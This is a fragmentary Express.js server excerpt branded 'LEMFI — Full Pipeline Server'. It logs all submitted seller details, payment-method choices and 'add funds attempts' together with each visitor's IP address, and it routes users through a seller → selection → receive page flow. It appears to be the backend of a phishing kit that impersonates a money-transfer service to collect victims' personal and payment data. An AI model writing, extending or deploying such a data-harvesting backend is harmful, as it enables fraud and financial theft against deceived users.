...
// 1. Seller Details → selection.html
app.post('/api/seller-details', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[SELLER DETAILS]');
...
app.post('/api/selection', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[PAYMENT METHOD SELECTION]');
...
// 6. Add Funds (index page)
app.post('/api/add-funds', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[ADD FUNDS ATTEMPT]');
...
app.listen(PORT, '0.0.0.0', () => {
    ...
    console.log(`\n  ${border}`);
    console.log(`  █                                                          █`);
    console.log(`  █     LEMFI  —  Full Pipeline Server                      █`);
    console.log(`  █     Status: RUNNING                                      █`);
    console.log(`  █     URL:     http://localhost:${PORT}                       █`);
    console.log(`  █                                                          █`);
    console.log(`  █     PIPELINE FLOW:                                       █`);
    console.log(`  █     seller.html → selection.html → receive.html          █`);
